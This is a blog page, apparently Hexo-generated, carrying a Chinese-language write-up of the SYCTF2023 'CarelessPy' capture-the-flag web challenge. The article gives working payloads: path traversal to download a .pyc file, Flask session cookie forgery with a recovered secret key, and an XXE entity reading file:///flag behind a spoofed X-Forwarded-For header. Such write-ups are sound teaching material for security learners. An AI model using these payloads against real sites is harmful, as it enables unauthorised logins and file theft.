@@ -1,0 +1,213 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Bamboo22 's Blog | Bamboo22 's Blog</title><meta name="author" content="Bamboo22"><meta name="copyright" content="Bamboo22"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="[SYCTF2023]CarelessPy 打开环境说下载图片，但其实没有什么用 查看源码，发现 /eval 和 /login   进入 /eval 发现是一个命令执行，但是只要传cmd就会报错  进入/login有一个登录框，但是登录不成功   在/login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在/e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bamboo22 's Blog">
+<meta property="og:url" content="http://example.com/2024/01/22/[SYCTF2023]CarelessPy/index.html">
+<meta property="og:site_name" content="Bamboo22 's Blog">
+<meta property="og:description" content="[SYCTF2023]CarelessPy 打开环境说下载图片，但其实没有什么用 查看源码，发现 /eval 和 /login   进入 /eval 发现是一个命令执行，但是只要传cmd就会报错  进入/login有一个登录框，但是登录不成功   在/login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在/e">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.bimg.cc/random">
+<meta property="article:published_time" content="2024-01-22T13:56:53.282Z">
+<meta property="article:modified_time" content="2023-10-30T08:30:41.837Z">
+<meta property="article:author" content="Bamboo22">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.bimg.cc/random"><link rel="shortcut icon" href="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg"><link rel="canonical" href="http://example.com/2024/01/22/[SYCTF2023]CarelessPy/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Bamboo22 \'s Blog',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-30 16:30:41'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://api.bimg.cc/random')"><nav id="nav"><span id="blog-info"><a href="/" title="Bamboo22 's Blog"><span class="site-name">Bamboo22 's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-01-22T13:56:53.282Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-30T08:30:41.837Z" title="更新于 2023-10-30 16:30:41">2023-10-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('https://api.bimg.cc/random');"></div><article class="post-content" id="article-container"><h2 id="SYCTF2023-CarelessPy"><a href="#SYCTF2023-CarelessPy" class="headerlink" title="[SYCTF2023]CarelessPy"></a>[SYCTF2023]CarelessPy</h2><p><img src="http://pic.bamboo22.top/image-20230610132618291.png"></p>
+<p>打开环境说下载图片，但其实没有什么用</p>
+<p>查看源码，发现 <code>/eval </code>和 <code>/login </code></p>
+<p><img src="http://pic.bamboo22.top/image-20230610132711588.png"></p>
+<p>进入 <code>/eval </code>发现是一个命令执行，但是只要传cmd就会报错</p>
+<p><img src="http://pic.bamboo22.top/image-20230610132912069.png"><br><img src="http://pic.bamboo22.top/image-20230610133109243.png"></p>
+<p>进入<code>/login</code>有一个登录框，但是登录不成功</p>
+<p><img src="http://pic.bamboo22.top/image-20230610133013051.png"></p>
+<p><img src="http://pic.bamboo22.top/image-20230610133036210.png"></p>
+<p>在/login中猜测这个应该就是flask的session伪造，伪造一个成功登陆的cookie从而实现登录，那需要的秘应该就是在/eval中去找</p>
+<p>我们先去/eval</p>
+<p>这里一个一个传参去试（至于为什么我也不知道），试到app就成功了</p>
+<p><img src="http://pic.bamboo22.top/image-20230610133620126.png"></p>
+<p>进到这儿继续试</p>
+<p><img src="http://pic.bamboo22.top/image-20230610133656260.png"></p>
+<p>得到这个后就进入一开始的下载页面，就能下载.pyc文件，注意这里需要yong<code>../</code>进行目录穿越，因为要将工作目录转到网站更目录，所以要退三次</p>
+<p><img src="http://pic.bamboo22.top/image-20230610140216067.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/eval?cmd=app</span><br><span class="line">/eval?cmd=app/__pycache__</span><br><span class="line">/download?file=../../..//app/__pycache__/part.cpython-311.pyc</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功后就会下载一个.pyc文件，直接开是打不开的，改成.txt就可以看了（里面的乱码是没用的）</p>
+<p><img src="http://pic.bamboo22.top/image-20230610141330544.png"></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:o2takuXX_donot_like_ntr</span><br></pre></td></tr></tbody></table></figure>
+
+<p>找到秘钥</p>
+<p>下面进到login界面，先登录失败，吧cookie复制下来</p>
+<p><img src="http://pic.bamboo22.top/image-20230610142507231.png"></p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session；</span><br><span class="line">eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38</span><br></pre></td></tr></tbody></table></figure>
+
+<p>放到flask-session-manager里面去跑</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s <span class="string">"o2takuXX_donot_like_ntr"</span> -c <span class="string">"eyJpc2xvZ2luIjpmYWxzZX0.ZIQWEw.Ym12DU18w-DqMwu6aUkiOl36U38"</span></span><br><span class="line">{<span class="string">'islogin'</span>: <span class="literal">False</span>}</span><br><span class="line">python flask_session_cookie_manager3.py encode -s <span class="string">"o2takuXX_donot_like_ntr"</span> -t <span class="string">"{'islogin': True}"</span></span><br><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZIQZiQ.dcWvoUa9FO92Jdym53c9hHkeP2Q</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="http://pic.bamboo22.top/image-20230610143508723.png"></p>
+<p>将session的值改了之后就能成功登录了</p>
+<p><img src="http://pic.bamboo22.top/image-20230610143643300.png"></p>
+<p>进入/th1s_1s_The_L4st_one看到XML，想到XXE漏洞，抓包</p>
+<p><img src="http://pic.bamboo22.top/image-20230610170650880.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1     </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE fumo [</span><br><span class="line">	&lt;!ENTITY a SYSTEM "file:///flag" &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;fumo&gt;&lt;web&gt;&amp;a;</span><br><span class="line">&lt;/web&gt;&lt;/fumo&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="http://pic.bamboo22.top/image-20230610173502583.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/22/[SYCTF2023]CarelessPy/">http://example.com/2024/01/22/[SYCTF2023]CarelessPy/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/22/gopher%E5%8D%8F%E8%AE%AE/" title=""><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2024/01/22/%5BNEEPU-CTF%202023%5Dezrce/" title=""><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">一蓑烟雨任平生</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcom to My Blog !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SYCTF2023-CarelessPy"><span class="toc-number">1.</span> <span class="toc-text">[SYCTF2023]CarelessPy</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/JWT/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/JWT/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/Redis%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="无题"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"></a><div class="content"><a class="title" href="/2024/01/22/%E5%8F%8D%E5%BC%B9shell/" title="无题">无题</a><time datetime="2024-01-22T13:56:53.286Z" title="发表于 2024-01-22 21:56:53">2024-01-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
